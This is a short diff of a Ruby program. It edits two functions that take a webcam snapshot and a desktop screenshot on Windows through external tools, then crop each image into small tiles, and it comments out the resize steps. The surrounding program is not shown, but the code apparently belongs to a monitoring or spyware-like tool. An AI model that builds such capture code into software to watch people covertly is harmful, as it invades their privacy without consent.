@@ -99,7 +99,7 @@ end
 def webcam()
   if OS.windows? then
     `WebCamImageSave.exe /capture /Filename webcam.png`
-    `magick mogrify -resize 50% webcam.png`
+    #`magick mogrify -resize 50% webcam.png`
     `magick convert -crop 10%x10% webcam.png webcam/webcam%d.png`
   else
     `whoami`
@@ -109,7 +109,7 @@ end
 def desktop()
   if OS.windows? then
     `nircmd.exe savescreenshot desktop.png`
-    `magick mogrify -resize 25% desktop.png`
+    #`magick mogrify -resize 25% desktop.png`
     `magick convert -crop 10%x10% desktop.png desktop/desktop%d.png`
   else
     `whoami`
